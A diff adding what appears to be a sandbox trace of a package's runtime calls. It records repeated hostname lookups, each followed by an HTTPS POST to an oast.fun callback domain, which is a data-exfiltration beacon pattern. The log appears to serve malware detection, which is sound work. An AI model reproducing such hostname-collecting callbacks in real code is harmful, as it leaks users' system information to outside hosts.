@@ -1,0 +1,8 @@
+[os.hostname] []
+[https.request] [{"hostname":"cjrtc7r2vtc000013170gjcpgryyyyyyb.oast.fun","port":443,"path":"/","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded","Content-Length":679}},null]
+[os.hostname] []
+[https.request] [{"hostname":"cjrtc7r2vtc000013170gjcpgryyyyyyb.oast.fun","port":443,"path":"/","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded","Content-Length":679}},null]
+[fs.writeFileSync] ["dynamic_log.txt","Triggered dynamic API"]
+[os.hostname] []
+[https.request] [{"hostname":"cjrtc7r2vtc000013170gjcpgryyyyyyb.oast.fun","port":443,"path":"/","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded","Content-Length":665}},null]
+[fs.writeFileSync] ["dynamic_log.txt","Triggered dynamic API"]
